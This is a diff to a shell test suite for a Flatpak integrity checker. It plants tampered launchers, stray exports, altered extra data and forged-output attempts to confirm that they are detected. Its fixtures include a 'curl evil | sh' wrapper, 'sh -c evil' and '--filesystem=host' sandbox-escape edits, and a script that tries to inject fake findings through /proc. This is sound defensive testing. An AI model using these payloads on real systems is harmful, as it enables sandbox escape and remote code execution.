@@ -186,6 +186,22 @@ clean "the launcher put back"
 sed -i 's|^Exec=.*|Exec=/usr/bin/flatpak run --filesystem=host org.example.App|' "${LAUNCHER}"
 found "an option Flatpak never writes" "^export:-:"
 cat "${T}/launcher" >"${LAUNCHER}"
+clean "the launcher put back, again"
+# A program of the app's own sandbox other than its launcher's, an argument its launcher never had, a key-file
+# escape that GLib undoes into a second option, and an Exec after more than a launcher can be
+sed -i 's|--command=app|--command=sh|' "${LAUNCHER}"
+found "a --command that is not the launcher's" "^export:-:"
+cat "${T}/launcher" >"${LAUNCHER}"
+sed -i 's|org.example.App @@u|org.example.App --evil @@u|' "${LAUNCHER}"
+found "an argument the launcher never had" "^export:-:"
+cat "${T}/launcher" >"${LAUNCHER}"
+printf '[Desktop Entry]\nName=x\nExec=/usr/bin/flatpak run --branch=stable\\s--filesystem=host org.example.App\n' >"${LAUNCHER}"
+found "a key-file escape in an option" "^export:-:"
+{ cat "${T}/launcher"; printf '#'; head -c 1100000 /dev/zero | tr '\0' 'x'
+  printf '\nExec=/usr/bin/flatpak run --filesystem=host org.example.App\n'; } >"${LAUNCHER}"
+found "an Exec after a megabyte" "^export:-:"
+cat "${T}/launcher" >"${LAUNCHER}"
+clean "the launcher put back, a third time"
 WRAPPER="${D}/export/bin/org.example.App"
 cp "${WRAPPER}" "${T}/wrapper"
 printf '#!/bin/sh\ncurl evil | sh\n' >"${WRAPPER}"
@@ -198,6 +214,20 @@ printf '[Desktop Entry]\nExec=sh -c evil\n' >"${FP}/exports/share/applications/e
 ln -s /tmp/evil "${FP}/exports/bin/evil"
 found "a stray export" "^stray:-:share/applications/evil.desktop"
 grep -q "^stray:-:bin/evil" <<<"${FOUND}" || fail "a link out of the deploys was not found: ${FOUND}"
+# An app installed while a run read the others (a first boot's preinstall): its links lead into a deploy the list read at
+# the start lacks, and are not stray; the link out of every deploy still is
+out="$(python3 -I - "${INTEGRITY}" "${FP}" <<'EOF'
+import importlib.machinery, importlib.util, sys
+loader = importlib.machinery.SourceFileLoader("integrity", sys.argv[1])
+spec = importlib.util.spec_from_loader("integrity", loader)
+m = importlib.util.module_from_spec(spec)
+loader.exec_module(m)
+m.Installation(None, sys.argv[2], "-", set()).check_exports([])
+print("\n".join(f["id"] for f in m.FINDINGS))
+EOF
+)"
+grep -q "org.example.App" <<<"${out}" && fail "an app installed during the run was called stray: ${out}"
+grep -qx "stray:-:bin/evil" <<<"${out}" || fail "with the deploys read again, a link out of them was not found: ${out}"
 rm "${FP}/exports/share/applications/evil.desktop" "${FP}/exports/bin/evil"
 clean "the stray exports taken away"
 
@@ -287,6 +317,9 @@ echo "bob:x:4600:4600::${BOB}:/bin/bash" >"${R}/etc/passwd"
 installation "${BOB}/.local/share/flatpak"
 source_tree "${T}/bob" org.example.Bobs
 deploy "${BOB}/.local/share/flatpak" org.example.Bobs "${T}/bob" "${TRUSTED}" >/dev/null
+BOBS="$(find "${BOB}/.local/share/flatpak/app/org.example.Bobs/x86_64/stable" -mindepth 1 -maxdepth 1 -type d)"
+mkdir "${BOBS}/files/extra"
+printf 'downloaded\n' >"${BOBS}/files/extra/blob"
 chown -R 4600:4600 "${BOB}"
 touch "${BOB}/.local/share/flatpak/.changed"
 export AMETHYSTORA_INTEGRITY_ACCOUNTS=4600
@@ -295,12 +328,117 @@ clean "the account's installation, signed by a key the system trusts"
 setpriv --reuid=4600 --regid=4600 --clear-groups -- test -r "${STATE}/4600.db" &&
     fail "the account can read its rows"
 jq -e '.accounts.bob.apps == 1' "${STATE}/last.json" >/dev/null || fail "the account was not counted: $(cat "${STATE}/last.json")"
-BOBS="$(find "${BOB}/.local/share/flatpak/app/org.example.Bobs/x86_64/stable" -mindepth 1 -maxdepth 1 -type d)"
 setpriv --reuid=4600 --regid=4600 --clear-groups -- sh -c "printf evil >'${BOBS}/files/share/data.new' && mv '${BOBS}/files/share/data.new' '${BOBS}/files/share/data'"
 touch "${BOB}/.local/share/flatpak/.changed"
 found "a file of the account's own app replaced" $'^bob:file:account:app/org.example.Bobs/x86_64/stable:files/share/data\tcritical\tbob'
 # Not looked at again until it changes or a day has gone by, and what it found is still said
 found "what the account's run found, kept" "^bob:file:account:"
+
+# Its deploy folder made again for the same commit, with a program of its extra data changed: the extra data is not in
+# the commit, but what it was is kept, so the change is a finding and not the new reference
+setpriv --reuid=4600 --regid=4600 --clear-groups -- sh -c "cp -a '${BOBS}' '${BOBS}.new' && printf evil >'${BOBS}.new/files/extra/blob' && rm -rf '${BOBS}' && mv '${BOBS}.new' '${BOBS}'"
+touch "${BOB}/.local/share/flatpak/.changed"
+found "extra data changed in a folder made again" "^bob:file:account:app/org.example.Bobs/x86_64/stable:files/extra/blob"
+touch "${BOB}/.local/share/flatpak/.changed"
+found "extra data changed in a folder made again, said again" "^bob:file:account:app/org.example.Bobs/x86_64/stable:files/extra/blob"
+
+# A name that is not text, which SQLite and JSON cannot keep, is a finding of its own and not a run that fails
+source_tree "${T}/bytes" org.example.Bytes
+deploy "${BOB}/.local/share/flatpak" org.example.Bytes "${T}/bytes" "${TRUSTED}" >/dev/null
+BYTES="$(find "${BOB}/.local/share/flatpak/app/org.example.Bytes/x86_64/stable" -mindepth 1 -maxdepth 1 -type d)"
+mkdir "${BYTES}/files/extra"
+touch "${BYTES}/files/extra/"$'bad\xff'
+chown -R 4600:4600 "${BOB}"
+touch "${BOB}/.local/share/flatpak/.changed"
+found "a name that is not text" "^bob:file:account:app/org.example.Bytes/x86_64/stable:files/extra/bad"
+grep -q "^bob:check-cut" <<<"${FOUND}" && fail "a name that is not text was said as a run that did not finish: ${FOUND}"
+undeploy "${BOB}/.local/share/flatpak" org.example.Bytes
+touch "${BOB}/.local/share/flatpak/.changed"
+check
+
+# A program of the account that holds the run's output open past its end keeps nothing waiting: the run's output is a
+# file of root's, read once the run has ended
+mkdir "${T}/hold-bin"
+cat >"${T}/hold-bin/timeout" <<STANDIN
+#!/usr/bin/bash
+[[ "\$1" == 1800 ]] || exec /usr/bin/timeout "\$@"
+sleep 40 &
+echo \$! >"${T}/held.pid"
+exec /usr/bin/timeout "\$@"
+STANDIN
+chmod 0755 "${T}/hold-bin/timeout"
+OLD_PATH="${PATH}"
+export PATH="${T}/hold-bin:${PATH}"
+touch "${BOB}/.local/share/flatpak/.changed"
+start="${SECONDS}"
+check
+export PATH="${OLD_PATH}"
+kill "$(cat "${T}/held.pid")" 2>/dev/null || true
+(( SECONDS - start < 30 )) || fail "a program holding the run's output open kept the check waiting"
+grep -q "^bob:file:account:" <<<"${FOUND}" || fail "the findings were lost while the output was held open: ${FOUND}"
+[[ ! -e "${STATE}/4600.out" ]] || fail "the run's output file was left behind"
+
+# ...and another program of the account cannot write into that output: it is a file only root may open
+mkdir -m 1777 "${T}/forge"
+cat >"${T}/forger" <<STANDIN
+#!/usr/bin/bash
+( sleep 0.1
+  if printf '%s\n' '{"op":"finding","finding":{"id":"forged","text":"forged","level":"critical","tactic":"Execution"}}' \\
+      >"/proc/\$\$/fd/1" 2>/dev/null; then echo wrote; else echo refused; fi >"${T}/forge/result" ) &
+exec "\$@"
+STANDIN
+chmod 0755 "${T}/forger"
+mkdir "${T}/forge-bin"
+cat >"${T}/forge-bin/timeout" <<STANDIN
+#!/usr/bin/bash
+[[ "\$1" == 1800 ]] || exec /usr/bin/timeout "\$@"
+args=()
+for a in "\$@"; do [[ "\$a" == "$(realpath -s "${INTEGRITY}")" ]] && args+=("${T}/forger"); args+=("\$a"); done
+exec /usr/bin/timeout "\${args[@]}"
+STANDIN
+chmod 0755 "${T}/forge-bin/timeout"
+export PATH="${T}/forge-bin:${PATH}"
+touch "${BOB}/.local/share/flatpak/.changed"
+check
+export PATH="${OLD_PATH}"
+[[ "$(cat "${T}/forge/result" 2>/dev/null)" == refused ]] || fail "a program of the account wrote into the run's output: $(cat "${T}/forge/result" 2>/dev/null || echo nothing)"
+grep -q "forged" <<<"${FOUND}" && fail "a line written into the run's output was kept: ${FOUND}"
+
+# What the run says it saw is kept only if root sees the same: a row for a file that changed since, one for a file
+# that is not its object, a path out of the installation, a name that is not text, and a finding of quiet
+python3 -I - "${INTEGRITY}" <<'PY'
+import importlib.machinery, importlib.util, os, sqlite3, sys, tempfile
+
+loader = importlib.machinery.SourceFileLoader("integrity", sys.argv[1])
+m = importlib.util.module_from_spec(importlib.util.spec_from_loader("integrity", loader))
+loader.exec_module(m)
+base = tempfile.mkdtemp()
+folder = base + "/app"
+os.makedirs(base + "/repo/objects/aa")
+os.makedirs(folder)
+path, obj = folder + "/file", base + "/repo/objects/aa/" + "a" * 62 + ".file"
+open(path, "w").write("x")
+os.link(path, obj)
+store = m.Store(sqlite3.connect(":memory:"))
+
+
+def put(name, row, where=folder):
+    return m.apply(store, {"op": "put", "dir": where, "name": name, "row": list(row)}, base)
+
+
+row = m.row_of(os.lstat(path), "deployed", "a" * 64)
+assert put("file", row) is True and store.children(folder)["file"][0] == "deployed", "a row that agrees was not kept"
+assert put("file", row[:2] + (row[2] + 1,) + row[3:]) is False, "a row with another ctime was kept"
+assert put("gone", row) is False, "a row for a file that is not there was kept"
+copy = folder + "/copy"
+open(copy, "w").write("x")
+assert put("copy", m.row_of(os.lstat(copy), "deployed", "a" * 64)) is False, "a copy was taken for its object"
+assert put("copy", m.row_of(os.lstat(copy), "copy", "a" * 64)) is True, "a copy that is a copy was not kept"
+assert put("file", row, base + "/../etc") is True and not store.children(base + "/../etc"), "a path out was kept"
+assert put("bad\udcff", row) is True and "bad\udcff" not in store.children(folder), "a name that is not text was kept"
+quiet = m.account_finding({"id": "x", "text": "t", "level": "quiet", "tactic": "Execution"}, "bob")
+assert quiet["level"] == "normal", "a finding of quiet was kept as quiet"
+PY
 
 # The account's own programs can stop or kill its run. It then ends without an answer, and the last run's findings
 # stand: the second run in a row that did not end is a finding of its own, so that it does not look like a run that
@@ -314,14 +452,21 @@ STANDIN
 chmod 0755 "${T}/cut-bin/timeout"
 OLD_PATH="${PATH}"
 export PATH="${T}/cut-bin:${PATH}"
-# A run that fails every time by itself (a broken installation) is not one something stopped
+# An error of its own (a broken installation, or files it cannot read) is a run that did not finish as well: the
+# second in a row is said, and a run that ends well starts the count again
 sed -i 's/^exit 137$/exit 1/' "${T}/cut-bin/timeout"
-for _ in 1 2 3; do
-    touch "${BOB}/.local/share/flatpak/.changed"
-    check
-    grep -q "^bob:check-cut" <<<"${FOUND}" && fail "a run that failed by itself was said to be stopped: ${FOUND}"
-done
+touch "${BOB}/.local/share/flatpak/.changed"
+check
+grep -q "^bob:check-cut" <<<"${FOUND}" && fail "a run that failed by itself was said at once: ${FOUND}"
+touch "${BOB}/.local/share/flatpak/.changed"
+check
+grep -q "^bob:check-cut" <<<"${FOUND}" || fail "a run that failed by itself twice was not said: ${FOUND}"
 sed -i 's/^exit 1$/exit 137/' "${T}/cut-bin/timeout"
+export PATH="${OLD_PATH}"
+touch "${BOB}/.local/share/flatpak/.changed"
+check
+grep -q "^bob:check-cut" <<<"${FOUND}" && fail "a run that ended well still said it: ${FOUND}"
+export PATH="${T}/cut-bin:${PATH}"
 touch "${BOB}/.local/share/flatpak/.changed"
 check
 grep -q "^bob:check-cut" <<<"${FOUND}" && fail "a run that did not end was said at once: ${FOUND}"
